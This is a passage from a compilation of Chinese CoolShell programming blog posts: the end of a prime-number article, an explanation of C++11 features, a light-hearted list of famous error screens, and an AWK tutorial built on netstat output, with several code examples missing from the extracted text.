四、取第三个数（5），因为4已经被去除了，再去掉所有可以被5整除的数。2  3     5     7          11    13          17    19          23                29接下来的数是7，但是7的平方是49，其大于了30，所以我们可以停止计算了。剩下的数就是所有的质数了。#### 实际应用的算法实际应用中，我们通常不会使用上述的两种算法，因为那是理论学院派的算法。实际中的算法是，我把质数事先就计算好，放在一个文件中，然后在程序启动时（注意是在启动时读这个文件，而不是运行时每调用一次就读一次文件），读取这个文件，然后打印出来就可以了。如果需要查找的化，二分查找或是hash表查找将会获得巨大的性能提升。当然，这样的方法对于空间来说比前面两个都要消耗得大，但是你可以有O(log(n))或是O(1)的时间复杂度。所以，我想在这里提醒大家—— **实际和理论的的方法很不一样的** ，千万不要读书读成书呆子。在游戏编程的世界里，大量的数据都不是运行计算的，而都是写在文件中的。比如，一个火焰效果，一个人物跑动的动作，都是事先写在文件中的。#### 使用编译时而不是运行时
下面这个例子（本例参考于这里）你需要注意了，这是一个高级用法，使用模式来在编译时计算质数，而不是运行时。这种技术使用了C++编译器对模板的特化时的处理来生成自己相要的结果。这种方法在技术上是相当Cool的，但并不一定实用，这里只是想像大家展示这种用法。这是C++的最骨灰级的用法了。请看下面的两个模板类，第一个模板以递归的方式检查是否是质数，第二个方法是递归的退出条件（当N=1时），对于模板的重载，请参看相关的C++书籍。于是，通过这个模板，我们可以使用下面的代码来检查是否是质数：if (isPrime<3>::result)     cout << "Guess what: 3 is a prime!";下一步，我们需要打出一个区间内的质数，所以，我们需要继续设计我们的print模板。从上面的代码中，我们可以看到，我们的第一个实际是什么也没做，而第二个有输出，注意第二个的模板参数中有一个true，其意味着那个质数的判断。于是我们就可以给出下面的代码来尝试着打印出一段区间内的质数：（ **请不要编译！！** 因为那会让编译器进入无限循环中，原因是printPrimes会不停地调用自己永不停止）
为了避免这个问题，你需要再加一个模板类，如下所示。这样当N变成MAX的时候，递归就结束了。最后，让我们来看看最终的调用：这个方法很NB，但是有两个问题：* 比较耗编译时间。   * 不能在运行时输入MAX的值。不过，相信这种玩法会启动你很多的编程思路。当然，还有以前说过的那个——《检查素数的正则表达式》（全文完）# C++11 中值得关注的几大变化（详解）作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn源文章来自前C++标准委员会的 Danny Kalev 的 The Biggest Changes in C++11 (and Why You Should Care)，赖勇浩做了一个中文翻译在这里。所以，我就不翻译了，我在这里仅对文中提到的这些变化“ **追问为什么要引入这些变化** ”的一个探讨， **只有知道为了什么，用在什么地方，我们才能真正学到这个知识** 。而以此你可以更深入地了解这些变化。所以，本文不是翻译。因为写得有些仓促，所以难免有问题，还请大家指正。目录* Lambda 表达式   * 自动类型推导 auto   * 自动化推导 decltype   * auto 和 decltype 的差别和关系   * 统一的初始化语法   * Delete 和 Default 函数   * nullptr   * 委托构造   * 右值引用和move语义   * C++ 11 STL 标准库     * 线程库     * 新型智能指针     * 新的算法
#### Lambda 表达式Lambda表达式来源于函数式编程，说白就了就是在使用的地方定义函数，有的语言叫“闭包”，如果 lambda 函数没有传回值(例如 `void` )，其回返类型可被完全忽略。 定义在与 lambda 函数相同作用域的变量参考也可以被使用。这种的变量集合一般被称作 closure（闭包）。我在这里就不再讲这个事了。表达式的简单语法如下，原文的作者给出了下面的例子：在传统的STL中for_each() 这个玩意最后那个参数需要一个“函数对象”，所谓函数对象，其实是一个class，这个class重载了operator()，于是这个对象可以像函数的式样的使用。实现一个函数对象并不容易，需要使用template，比如下面这个例子就是函数对象的简单例子（实际的实现远比这个复杂）：所以， **C++引入Lambda的最主要原因就是1）可以定义匿名函数，2）编译器会把其转成函数对象** 。相信你会和我一样，会疑问为什么以前STL中的ptr_fun()这个函数对象不能用？（ptr_fun()就是把一个自然函数转成函数对象的）。原因是，ptr_fun() 的局限是其接收的自然函数只能有1或2个参数。
那么，除了方便外，为什么一定要使用Lambda呢？它比传统的函数或是函数对象有什么好处呢？我个人所理解的是，这种函数之年以叫“闭包”，就是因为其限制了别人的访问，更私有。也可以认为他是一次性的方法。Lambda表达式应该是简洁的，极私有的，为了更易的代码和更方便的编程。#### 自动类型推导 auto在这一节中，原文主要介绍了两个关键字 auto 和 deltype，示例如下：auto x=0; //x has type int because 0 is int     auto c='a'; //char     auto d=0.5; //double     auto national_debt=14400000000000LL;//long longauto 最大的好处就是让代码简洁，尤其是那些模板类的声明，比如：STL中的容器的迭代子类型。`vector<int>::const_iterator ci = vi.begin();`可以变成：`auto ci = vi.begin();`模板这个特性让C++的代码变得很难读，不信你可以看看STL的源码，那是一个乱啊。使用auto必需一个初始化值，编译器可以通过这个初始化值推导出类型。因为auto是来简化模板类引入的代码难读的问题，如上面的示例，iteration这种类型就最适合用auto的，但是，我们不应该把其滥用。
比如下面的代码的可读性就降低了。因为，我不知道ProcessData返回什么？int? bool? 还是对象？或是别的什么？这让你后面的程序不知道怎么做。`auto obj = ProcessData(someVariables);`但是下面的程序就没有问题，因为pObject的型别在后面的new中有了。`auto pObject = new SomeType<OtherType>::SomeOtherType();`#### 自动化推导 decltype关于 `decltype` 是一个操作符，其可以评估括号内表达式的类型，其规则如下：1. 如果表达式e是一个变量，那么就是这个变量的类型。   2. 如果表达式e是一个函数，那么就是这个函数返回值的类型。   3. 如果不符合1和2，如果e是左值，类型为T，那么decltype(e)是T&；如果是右值，则是T。原文给出的示例如下，我们可以看到，这个让的确我们的定义变量省了很多事。const vector<int> vi;     typedef decltype (vi.begin()) CIT;     CIT another_const_iterator;
还有一个适合的用法是用来typedef函数指针，也会省很多事。比如：decltype(&myfunc) pfunc = 0;typedef decltype(&A::func1) type;#### auto 和 decltype 的差别和关系Wikipedia 上是这么说的（关于decltype的规则见上）int main()     {     const std::vector<int> v(1);     auto a = v[0];        // a 的类型是 int     decltype(v[0]) b = 1; // b 的类型是 const int&, 因为函数的返回类型是     // std::vector<int>::operator const     auto c = 0;           // c 的类型是 int     auto d = c;           // d 的类型是 int     decltype(c) e;        // e 的类型是 int, 因为 c 的类型是int     decltype((c)) f = c;  // f 的类型是 int&, 因为 (c) 是左值     decltype(0) g;        // g 的类型是 int, 因为 0 是右值     }
如果auto 和 decltype 在一起使用会是什么样子？能看下面的示例，下面这个示例也是引入decltype的一个原因——让C++有能力写一个 “ forwarding function 模板”，这个函数模板看起来相当费解，其用到了auto 和 decltype 来扩展了已有的模板技术的不足。怎么个不足呢？在上例中，我不知道AddingFunc会接收什么样类型的对象，这两个对象的 + 操作符返回的类型也不知道，老的模板函数无法定义AddingFunc返回值和这两个对象相加后的返回值匹配，所以，你可以使用上述的这种定义。#### 统一的初始化语法C/C++的初始化的方法比较，C++ 11 用大括号统一了这些初始化的方法。比如：POD的类型。关于POD相说两句，所谓POD就是Plain Old Data，当class/struct是 _极简的(trivial)_ 、属于 _标准布局(standard-layout)_ ，以及他的所有非静态（non- static）成员都是POD时，会被视为POD。如：POD的初始化有点怪，比如上例，new A; 和new A(); 是不一样的，对于其内部的m，前者没有被初始化，后者被初始化了（不同 的编译器行为不一样，VC++和GCC不一样）。而非POD的初始化，则都会被初始化。
从这点可以看出，C/C++的初始化问题很奇怪，所以，在C++ 2011版中就做了统一。原文作者给出了如下的示例：C c {0,0}; //C++11 only. 相当于: C c(0,0);容器的初始化：还支持像Java一样的成员初始化：#### Delete 和 Default 函数我们知道C++的编译器在你没有定义某些成员函数的时候会给你的类自动生成这些函数，比如，构造函数，拷贝构造，析构函数，赋值函数。有些时候，我们不想要这些函数，比如，构造函数，因为我们想做实现单例模式。传统的做法是将其声明成private类型。在新的C++中引入了两个指示符，delete意为告诉编译器不自动产生这个函数，default告诉编译器产生一个默认的。原文给出了下面两个例子：再如delete这里，我想说一下，为什么我们需要default？我什么都不写不就是default吗？不全然是，比如构造函数，因为只要你定义了一个构造函数，编译器就不会给你生成一个默认的了。所以，为了要让默认的和自定义的共存，才引入这个参数，如下例所示：struct SomeType     {     SomeType() = default; // 使用编译器生成的默认构造函数     SomeType(OtherType value);     };
关于delete还有两个有用的地方是1）让你的对象只能生成在栈内存上：2）阻止函数的其形参的类型调用：（若尝试以 double 的形参调用 `f()`，将会引发编译期错误， 编译器不会自动将 double 形参转型为 int 再调用`f()`，如果传入的参数是double，则会出现编译错误）void f(int i);     void f(double) = delete;#### nullptrC/C++的NULL宏是个被有很多潜在BUG的宏。因为有的库把其定义成整数0，有的定义成 (void*)0。在C的时代还好。但是在C++的时代，这就会引发很多问题。你可以上网看看。这是为什么需要 `nullptr` 的原因。 `nullptr` 是强类型的。void f(int); //#1     void f(char *);//#2     //C++03     f(0); //二义性     //C++11     f(nullptr) //无二义性，调用f(char*)`所以在新版中请以 nullptr` 初始化指针。#### 委托构造在以前的C++中，构造函数之间不能互相调用，所以，我们在写这些相似的构造函数里，我们会把相同的代码放到一个私有的成员函数中。
但是，为了方便并不足让“委托构造”这个事出现，最主要的问题是，基类的构造不能直接成为派生类的构造，就算是基类的构造函数够了，派生类还要自己写自己的构造函数：上例中，派生类手动继承基类的构造函数， 编译器可以使用基类的构造函数完成派生类的构造。 而将基类的构造函数带入派生类的动作 无法选择性地部分带入， 所以，要不就是继承基类全部的构造函数，要不就是一个都不继承(不手动带入)。 此外，若牵涉到多重继承，从多个基类继承而来的构造函数不可以有相同的函数签名(signature)。 而派生类的新加入的构造函数也不可以和继承而来的基类构造函数有相同的函数签名，因为这相当于重复声明。（所谓函数签名就是函数的参数类型和顺序不）#### 右值引用和move语义在老版的C++中，临时性变量（称为右值”R-values”，位于赋值操作符之右）经常用作交换两个变量。比如下面的示例中的tmp变量。示例中的那个函数需要传递两个string的引用，但是在交换的过程中产生了对象的构造，内存的分配还有对象的拷贝构造等等动作，成本比较高。C++ 11增加一个新的引用（reference）类型称作右值引用（R-value reference），标记为`typename &&`。他们能够以non-const值的方式传入，允许对象去改动他们。这项修正允许特定对象创造出move语义。
举例而言，上面那个例子中，string类中保存了一个动态内存分存的char*指针，如果一个string对象发生拷贝构造（如：函数返回），string类里的char*内存只能通过创建一个新的临时对象，并把函数内的对象的内存copy到这个新的对象中，然后销毁临时对象及其内存。 **这是原来C++性能上重点被批评的事** 。能过右值引用，string的构造函数需要改成“move构造函数”，如下所示。这样一来，使得对某个stirng的右值引用可以单纯地从右值复制其内部C- style的指针到新的string，然后留下空的右值。这个操作不需要内存数组的复制，而且空的暂时对象的析构也不会释放内存。其更有效率。The C++11 STL中广泛地使用了右值引用和move语议。因此，很多算法和容器的性能都被优化了。#### C++ 11 STL 标准库C++ STL库在2003年经历了很大的整容手术 Library Technical Report 1 (TR1)。 TR1 中出现了很多新的容器类 (`unordered_set`, `unordered_map`, `unordered_multiset`, 和 `unordered_multimap`) 以及一些新的库支持诸如：正则表达式， tuples，函数对象包装，等等。 C++11 批准了 TR1 成为正式的C++标准，还有一些TR1 后新加的一些库，从而成为了新的C++ 11 STL标准库。这个库主要包含下面的功能：
##### 线程库这们就不多说了，以前的STL饱受线程安全的批评。现在好 了。C++ 11 支持线程类了。这将涉及两个部分：第一、设计一个可以使多个线程在一个进程中共存的内存模型；第二、为线程之间的交互提供支持。第二部分将由程序库提供支持。大家可以看看promises and futures，其用于对象的同步。 async() 函数模板用于发起并发任务，而 thread_local 为线程内的数据指定存储类型。更多的东西，可以查看 Anthony Williams的 Simpler Multithreading in C++0x.##### 新型智能指针C++98 的知能指针是 `auto_ptr， 在C++ 11中被废弃了。`C++11 引入了两个指针类： shared_ptr 和 unique_ptr。 shared_ptr只是单纯的引用计数指针，`unique_ptr 是用来取代`auto_ptr``。 `unique_ptr` 提供 `auto_ptr` 大部份特性，唯一的例外是 `auto_ptr` 的不安全、隐性的左值搬移。不像 `auto_ptr`，`unique_ptr` 可以存放在 C++0x 提出的那些能察觉搬移动作的容器之中。
为什么要这么干？大家可以看看《More Effective C++》中对 auto_ptr的讨论。##### 新的算法定义了一些新的算法： `all_of()`, `any_of()` 和 `none_of()。`使用新的copy_n()算法，你可以很方便地拷贝数组。使用 `iota()` 可以用来创建递增的数列。如下例所示：总之，看下来，C++11 还是很学院派，很多实用的东西还是没有，比如： XML，sockets，reflection，当然还有垃圾回收。看来要等到C++ 20了。呵呵。不过C++ 11在性能上还是很快。参看 Google’s benchmark tests。原文还引用Stroustrup 的观点：C++11 是一门新的语言——一个更好的 C++。如果把所有的改变都列出来，你会发现真多啊。我估计C++ Primer那本书的厚度要增加至少30%以上。C++的门槛会不会越来越高了呢？我不知道，但我个人觉得这门语言的确是变得越来越令人望而却步了。（想起了某人和我说的一句话——学技术真的是太累了，还是搞方法论好混些？）（全文完）# 10大经典错误作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
下面是10、11个经典的错误，升序排名。希望大家补充！目录* 10、DOS的Abort，Retry, Fail？错误   * 9、Windows Vista 的红屏错误   * 8、PC机的开机报警   * 7、Twitter的大鲸鱼   * 6、Kernel Panic   * 5、Windows的非法操作   * 4、Windows RPC Error   * 3、Xbox 360 三红错误   * 2、Web上的404错误   * 1、Windows 蓝屏错误   * 0、该页无法显示错误#### 10、DOS的Abort，Retry, Fail？错误85年以后出生的人可能不知道DOS是什么了，只有那老家伙还知道这是什么。我还记得当时的我对于Abort和Fail这两个选择还是比较清楚的，不过，今天完全忘记了Abort和Fail的差别是什么？这个出是DOS下的经常出现，也相当的经典，以至于在Wikepedia上都有专门的业面 Abort, Retry, Fail?。简称为ARF。当然，ARI – Abort, Retry, Ignore?#### 9、Windows Vista 的红屏错误
红屏错误（RSoD – Red Screen of Death）不单单只是Windows Vista引入的（也许是蓝屏太有名了，突然变成红屏，大家觉得这个是比蓝屏更NB的错，所以也就引人关注了），PlayStation的也喜欢使用红屏。Windows Vista 的 RSoDPSP的红屏#### 8、PC机的开机报警攒过PC的朋友都知道如果你的内存条有问题，PC开机时会长鸣报警，一长一短则是显卡有问题，等等。你可以上Wikipedia上看看相关的词条——Power On Self-Test Beep。第一代的AMI BIOS#### 7、Twitter的大鲸鱼Twitter的服务器负载一吃紧，下面的这个页面就会显现出来了，大家把它叫做 **Fail Whale** ，这个情况在今年4月份以前的2到3年是非常频繁发生的，现在看似好很多了，看来Twitter工程师们克服了这个负载问题。你千万不要以为这个图是Twitter自己设计的，这个图是一个叫Yiying Lu的人设计的。不过由Twitter引发出来的文化影响力是比较深远的，甚至还出现了相要把这个事发扬光大的Fail Whale project (@FailWhale, failwhale.com)以及相关的T恤衫。你可以看看这篇文章。
Twitter Fail Whale#### 6、Kernel PanicKernel Panic相关于Windows 的蓝屏错误，其发生在Mac OS X和Linux下，在Mac OS X v10.6 _Snow Leopard_ 中，当进入内核错误后，会在画面上出现一个有英语、法语、德语、西班牙语及日语的当机画面，被多数用户称为“五国语言当机”，简称“五国”。在Linux上则是Linux Kernel oops。当内核检测到问题时，它会打印一个oops信息然后杀死全部相关进程。oops信息可以帮助Linux内核工程师调试，检测oops出现的条件，并修复导致oops的程序错误。Mac OS X 10.6的内核错误警告，俗称“五国” PA- RISC上发生的Linux内核oops，用ASCII显示一头死牛#### 5、Windows的非法操作这个错误信息主要是操作系统用来保护自己的错误，也就是Windows下的程序crash。通常来说，是内存访问错误引发的。不过，这个东西在windows下太多了，这是Win95和Win98中的大量的问题，包括微软自己的软件也经常出现这个问题，最为典型的就是IE6的crash。让IE6 出现这样的错误真是太简单了，参看酷壳的这篇文章。
该程序执行了非法操作#### 4、Windows RPC Error这个错误之所以很牛，是因为在2003年的8月份，很多使用Windows的用户都看到了这个错误，其系统被强行重启，重启了以后又收到这个错误，然后又被重启。这个事看上去就像一个正常的Windows的错误（相当正常，因为这样的红叉叉在Windows上看到了N多次了，用户都习惯了），但其实，这个事是有人故意的，这就是那个著名的Blaster worm)蠕虫病毒，其利用了Windows DCOM的一个漏洞。Windows RPC Error#### 3、Xbox 360 三红错误这个错误又叫RRoD – Red Ring of Death，在中国地区叫“三红”。微软在推出的游戏主机Xbox360后，众多用户曾向微软方面投诉游戏主机经常出现不同程度的故障，而且概率偏高，有调查显示，早期版本Xbox360返修率高达68% ，而最近的报告指出故障机率还是有33%。过热是游戏配件产品制造商Nyko认为Xbox360主机发生三红灯警告的主要原因，也有人指出因为Xbox 360机能不足所以长期开机超频引致过热。有报告指出微软花费了超过11.5亿美元在回收及修理出现问题的XBOX 360。
XBox 360 Red Ring of Death#### 2、Web上的404错误HTTP 404或Not Found错误讯息是HTTP的其中一种“标准回应讯息”（HTTP状态码），此讯息代表客户端在浏览网页时，服务器无法打到用户要请求的资源，所以报错。404是一个你无法避免的错误，因为可能是因为用户或你的开发人员编码里打错连接。所以，很多公司借用这个机会来美化404页面，本站以前也介绍过（如：StackOverflow的404，各式各样的404错），这里还有一个404的一首诗：> four oh four   >  by mind21_98 > > oh what a wonderful tizzy   >  which was in a fizzy   >  he couldn’t find the file   >  which was hiding in the bushes > > push the back button oh traveller   >  contact the owner of the last tavern   >  find out how to get to where you’re going   >  and be on your way
#### 1、Windows 蓝屏错误Blue Screen of Death，缩写为： **BSoD** 。这是这个世界最著名的错误了，和Kernel Panic 一样，基本上就是说，内核死翘翘了。在各种场合上我们都能看到这个错误。北京2008奥林匹克 飞机场航班显示 商场显示屏Bill Gates在Win98发布会上的蓝屏遭遇：本来文章到这里就可以结束了，上文参考自这里The 13 Greatest Error Message of All Time。不过，我觉得还有一个错误必然会载入史册。这就是下面的“该页无法显示错误”#### 0、该页无法显示错误这个错误对于中国用户不会陌生。这个错误以前更多的是Connection Reset，N年前你访问很多国外的网站者会遇到Connection Reset错，今天呢，更多的是“Time Out”，因为，关键词匹配太耗性能了，图片和视频的无法使用关键词过滤，所以，还不如直接封了IP，简单而粗暴，今天的Connection Reset更多的是出现在使用Google的搜索，当你搜某些关键词时就出这个错了。该页无法显示 Connection Reset
（全文完）# AWK 简明教程作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn有一些网友看了前两天的《Linux下应该知道的技巧》希望我能教教他们用awk和sed，所以，出现了这篇文章。我估计这些80后的年轻朋友可能对awk/sed这类上古神器有点陌生了，所以需要我这个老家伙来炒炒冷饭。 **况且，AWK是贝尔实验室1977年搞出来的文本出现神器，今年是蛇年，是AWK的本命年，而且年纪和我相仿，所以非常有必要为他写篇文章** 。之所以叫AWK是因为其取了三位创始人 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 的Family Name的首字符。要学AWK，就得提一提AWK的一本相当经典的书《The AWK Programming Language》，它在豆瓣上的评分是9.4分！在亚马逊上居然卖1022.30元。我在这里的教程并不想面面俱到，本文和我之前的Go语言简介一样，全是示例，基本无废话。**我只想达到两个目的：****1）你可以在乘坐公交地铁上下班，或是在坐马桶拉大便时读完（保证是一泡大便的工夫）。**
**2）我只想让这篇博文像一个火辣的脱衣舞女挑起你的兴趣，然后还要你自己去下工夫去撸。**废话少说，我们开始脱吧（注：这里只是topless）。目录* 起步上台   * 脱掉外套     * 过滤记录     * 内建变量     * 指定分隔符   * 脱掉衬衫     * 字符串匹配     * 统计   * 脱掉内衣     * awk脚本     * 环境变量   * 几个花活   * 自己撸吧#### 起步上台我从netstat命令中提取了如下信息作为用例：$ cat netstat.txt     Proto Recv-Q Send-Q Local-Address          Foreign-Address             State     tcp        0      0 0.0.0.0:3306           0.0.0.0:*                   LISTEN     tcp        0      0 0.0.0.0:80             0.0.0.0:*                   LISTEN     tcp        0      0 127.0.0.1:9000         0.0.0.0:*                   LISTEN     tcp        0      0 coolshell.cn:80        124.205.5.146:18245         TIME_WAIT     tcp        0      0 coolshell.cn:80        61.140.101.185:37538        FIN_WAIT2     tcp        0      0 coolshell.cn:80        110.194.134.189:1032        ESTABLISHED     tcp        0      0 coolshell.cn:80        123.169.124.111:49809       ESTABLISHED     tcp        0      0 coolshell.cn:80        116.234.127.77:11502        FIN_WAIT2     tcp        0      0 coolshell.cn:80        123.169.124.111:49829       ESTABLISHED     tcp        0      0 coolshell.cn:80        183.60.215.36:36970         TIME_WAIT     tcp        0   4166 coolshell.cn:80        61.148.242.38:30901         ESTABLISHED     tcp        0      1 coolshell.cn:80        124.152.181.209:26825       FIN_WAIT1     tcp        0      0 coolshell.cn:80        110.194.134.189:4796        ESTABLISHED     tcp        0      0 coolshell.cn:80        183.60.212.163:51082        TIME_WAIT     tcp        0      1 coolshell.cn:80        208.115.113.92:50601        LAST_ACK     tcp        0      0 coolshell.cn:80        123.169.124.111:49840       ESTABLISHED     tcp        0      0 coolshell.cn:80        117.136.20.85:50025         FIN_WAIT2     tcp        0      0 :::22                  :::*                        LISTEN
下面是最简单最常用的awk示例，其输出第1列和第4例，* 其中单引号中的被大括号括着的就是awk的语句，注意，其只能被单引号包含。   * 其中的$1..$n表示第几例。注：$0表示整个行。我们再来看看awk的格式化输出，和C语言的printf没什么两样：#### 脱掉外套##### 过滤记录我们再来看看如何过滤记录（下面过滤条件为：第三列的值为0 && 第6列的值为LISTEN）$ awk '$3==0 && $6=="LISTEN" ' netstat.txt     tcp        0      0 0.0.0.0:3306               0.0.0.0:*              LISTEN     tcp        0      0 0.0.0.0:80                 0.0.0.0:*              LISTEN     tcp        0      0 127.0.0.1:9000             0.0.0.0:*              LISTEN     tcp        0      0 :::22                      :::*                   LISTEN
其中的“==”为比较运算符。其他比较运算符：!=, >, <, >=, <=我们来看看各种过滤记录的方式：如果我们需要表头的话，我们可以引入内建变量NR：$ awk '$3==0 && $6=="LISTEN" || NR==1 ' netstat.txt     Proto Recv-Q Send-Q Local-Address          Foreign-Address             State     tcp        0      0 0.0.0.0:3306           0.0.0.0:*                   LISTEN     tcp        0      0 0.0.0.0:80             0.0.0.0:*                   LISTEN     tcp        0      0 127.0.0.1:9000         0.0.0.0:*                   LISTEN     tcp        0      0 :::22                  :::*                        LISTEN
再加上格式化输出：##### **内建变量**说到了内建变量，我们可以来看看awk的一些内建变量：$0 | 当前记录（这个变量中存放着整个行的内容）   ---|---   $1~$n | 当前记录的第n个字段，字段间由FS分隔   FS | 输入字段分隔符 默认是空格或Tab   NF | 当前记录中的字段个数，就是有多少列   NR | 已经读出的记录数，就是行号，从1开始，如果有多个文件话，这个值也是不断累加中。   FNR | 当前记录数，与NR不同的是，这个值会是各个文件自己的行号   RS | 输入的记录分隔符， 默认为换行符   OFS | 输出字段分隔符， 默认也是空格   ORS | 输出的记录分隔符，默认为换行符   FILENAME | 当前输入文件的名字怎么使用呢，比如：我们如果要输出行号：##### **指定分隔符**上面的命令也等价于：（-F的意思就是指定分隔符）注：如果你要指定多个分隔符，你可以这样来：`awk -F '[;:]'`再来看一个以\t作为分隔符输出的例子（下面使用了/etc/passwd文件，这个文件是以:分隔的）：#### 脱掉衬衫##### 字符串匹配
我们再来看几个字符串匹配的示例：上面的第一个示例匹配FIN状态， 第二个示例匹配WAIT字样的状态。其实 ~ 表示模式开始。/ /中是模式。这就是一个正则表达式的匹配。其实awk可以像grep一样的去匹配第一行，就像这样：$ awk '/LISTEN/' netstat.txt     tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN     tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN     tcp        0      0 :::22                   :::*                    LISTEN我们可以使用 “/FIN|TIME/” 来匹配 FIN 或者 TIME :再来看看模式取反的例子：
或是：`awk '!/WAIT/' netstat.txt`**折分文件**awk拆分文件很简单，使用重定向就好了。下面这个例子，是按第6例分隔文件，相当的简单（其中的NR!=1表示不处理表头）。$ ls     ESTABLISHED  FIN_WAIT1  FIN_WAIT2  LAST_ACK  LISTEN  netstat.txt  TIME_WAIT$ cat ESTABLISHED     tcp        0      0 coolshell.cn:80        110.194.134.189:1032        ESTABLISHED     tcp        0      0 coolshell.cn:80        123.169.124.111:49809       ESTABLISHED     tcp        0      0 coolshell.cn:80        123.169.124.111:49829       ESTABLISHED     tcp        0   4166 coolshell.cn:80        61.148.242.38:30901         ESTABLISHED     tcp        0      0 coolshell.cn:80        110.194.134.189:4796        ESTABLISHED     tcp        0      0 coolshell.cn:80        123.169.124.111:49840       ESTABLISHED
$ cat FIN_WAIT1     tcp        0      1 coolshell.cn:80        124.152.181.209:26825       FIN_WAIT1$ cat FIN_WAIT2     tcp        0      0 coolshell.cn:80        61.140.101.185:37538        FIN_WAIT2     tcp        0      0 coolshell.cn:80        116.234.127.77:11502        FIN_WAIT2     tcp        0      0 coolshell.cn:80        117.136.20.85:50025         FIN_WAIT2$ cat LAST_ACK     tcp        0      1 coolshell.cn:80        208.115.113.92:50601        LAST_ACK$ cat LISTEN     tcp        0      0 0.0.0.0:3306           0.0.0.0:*                   LISTEN     tcp        0      0 0.0.0.0:80             0.0.0.0:*                   LISTEN     tcp        0      0 127.0.0.1:9000         0.0.0.0:*                   LISTEN     tcp        0      0 :::22                  :::*                        LISTEN
$ cat TIME_WAIT     tcp        0      0 coolshell.cn:80        124.205.5.146:18245         TIME_WAIT     tcp        0      0 coolshell.cn:80        183.60.215.36:36970         TIME_WAIT     tcp        0      0 coolshell.cn:80        183.60.212.163:51082        TIME_WAIT你也可以把指定的列输出到文件：再复杂一点：（注意其中的if-else-if语句，可见awk其实是个脚本解释器）$ ls ?.txt     1.txt  2.txt  3.txt$ cat 1.txt     tcp        0      0 coolshell.cn:80        124.205.5.146:18245         TIME_WAIT     tcp        0      0 coolshell.cn:80        110.194.134.189:1032        ESTABLISHED     tcp        0      0 coolshell.cn:80        123.169.124.111:49809       ESTABLISHED     tcp        0      0 coolshell.cn:80        123.169.124.111:49829       ESTABLISHED     tcp        0      0 coolshell.cn:80        183.60.215.36:36970         TIME_WAIT     tcp        0   4166 coolshell.cn:80        61.148.242.38:30901         ESTABLISHED     tcp        0      0 coolshell.cn:80        110.194.134.189:4796        ESTABLISHED     tcp        0      0 coolshell.cn:80        183.60.212.163:51082        TIME_WAIT     tcp        0      0 coolshell.cn:80        123.169.124.111:49840       ESTABLISHED
$ cat 2.txt     tcp        0      0 0.0.0.0:3306           0.0.0.0:*                   LISTEN     tcp        0      0 0.0.0.0:80             0.0.0.0:*                   LISTEN     tcp        0      0 127.0.0.1:9000         0.0.0.0:*                   LISTEN     tcp        0      0 :::22                  :::*                        LISTEN$ cat 3.txt     tcp        0      0 coolshell.cn:80        61.140.101.185:37538        FIN_WAIT2     tcp        0      0 coolshell.cn:80        116.234.127.77:11502        FIN_WAIT2     tcp        0      1 coolshell.cn:80        124.152.181.209:26825       FIN_WAIT1     tcp        0      1 coolshell.cn:80        208.115.113.92:50601        LAST_ACK     tcp        0      0 coolshell.cn:80        117.136.20.85:50025         FIN_WAIT2
##### 统计下面的命令计算所有的C文件，CPP文件和H文件的文件大小总和。我们再来看一个统计各个connection状态的用法：（我们可以看到一些编程的影子了，大家都是程序员我就不解释了。注意其中的数组的用法）再来看看统计每个用户的进程的占了多少内存（注：sum的RSS那一列）#### 脱掉内衣##### awk脚本在上面我们可以看到一个END关键字。END的意思是“处理完所有的行的标识”，即然说到了END就有必要介绍一下BEGIN，这两个关键字意味着执行前和执行后的意思，语法如下：* BEGIN{ 这里面放的是执行前的语句 }   * END {这里面放的是处理完所有的行后要执行的语句 }   * {这里面放的是处理每一行时要执行的语句}为了说清楚这个事，我们来看看下面的示例：假设有这么一个文件（学生成绩表）：$ cat score.txt     Marry   2143 78 84 77     Jack    2321 66 78 45     Tom     2122 48 77 71     Mike    2537 87 97 95     Bob     2415 40 57 62
我们的awk脚本如下（我没有写有命令行上是因为命令行上不易读，另外也在介绍另一种用法）：$ cat cal.awk     #!/bin/awk -f     #运行前     BEGIN {     math = 0     english = 0     computer = 0printf "NAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL\n"     printf "---------------------------------------------\n"     }     #运行中     {     math+=$3     english+=$4     computer+=$5     printf "%-6s %-6s %4d %8d %8d %8d\n", $1, $2, $3,$4,$5, $3+$4+$5     }     #运行后     END {     printf "---------------------------------------------\n"     printf "  TOTAL:%10d %8d %8d \n", math, english, computer     printf "AVERAGE:%10.2f %8.2f %8.2f\n", math/NR, english/NR, computer/NR     }
我们来看一下执行结果：（也可以这样运行 ./cal.awk score.txt）$ awk -f cal.awk score.txt     NAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL     ---------------------------------------------     Marry  2143     78       84       77      239     Jack   2321     66       78       45      189     Tom    2122     48       77       71      196     Mike   2537     87       97       95      279     Bob    2415     40       57       62      159     ---------------------------------------------     TOTAL:       319      393      350     AVERAGE:     63.80    78.60    70.00
##### 环境变量即然说到了脚本，我们来看看怎么和环境变量交互：（使用-v参数和ENVIRON，使用ENVIRON的环境变量需要export）$ x=5$ y=10     $ export y$ echo $x $y     5 10#### 几个花活最后，我们再来看几个小例子：#从file文件中找出长度大于80的行     awk 'length>80' file#按连接数查看客户端IP     netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr#打印99乘法表     seq 9 | sed 'H;g' | awk -v RS='' '{for(i=1;i<=NF;i++)printf("%dx%d=%d%s", i, NR, i*NR, i==NR?"\n":"\t")}'#### 自己撸吧关于其中的一些知识点可以参看gawk的手册：* 内建变量，参看：   * 流控方面，参看：   * 内建函数，参看：   * 正则表达式，参看：（全文完）# 让我们来谈谈分工作者：陈皓，左耳朵耗子
